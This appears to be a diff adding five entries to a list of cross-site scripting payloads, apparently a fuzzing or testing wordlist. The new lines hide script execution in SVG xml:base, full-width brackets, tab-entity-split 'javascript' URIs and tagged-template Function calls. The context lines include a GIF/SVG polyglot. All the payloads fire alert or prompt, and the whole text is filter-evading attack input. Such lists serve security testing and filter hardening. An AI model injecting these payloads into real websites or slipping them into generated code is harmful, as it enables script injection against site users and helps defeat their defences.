@@ -1708,3 +1708,8 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <a href="file:///Applications/Calculator.app"><svg onload="this.parentNose.click()"></a>
 <script type=text/babel>prompt(7)</script>
 <script type="text/rocketscript">prompt(7`)</script>
+<svg><a xml:base="javascript:alert(1)//" href="#"><circle r="100" /></svg>
+†‡•＜img src=a onerror=javascript:alert(1)>…‰€
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+<script>location.href;'javascript:alert%281%29'</script>
